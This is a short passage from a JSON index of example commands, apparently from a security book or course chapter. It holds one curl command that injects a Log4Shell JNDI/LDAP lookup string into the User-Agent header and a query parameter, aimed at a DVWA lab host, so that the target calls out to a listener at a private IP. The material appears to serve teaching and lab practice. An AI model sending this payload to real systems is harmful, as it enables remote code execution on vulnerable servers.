    "file": "examples/rev02/chapter07/C07-25.txt",
    "text": "curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.108:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.108:1389/a}' \\\n  http://dvwa.ccc.com/"
  },
  {
    "document": "volume01-chapter07.json",
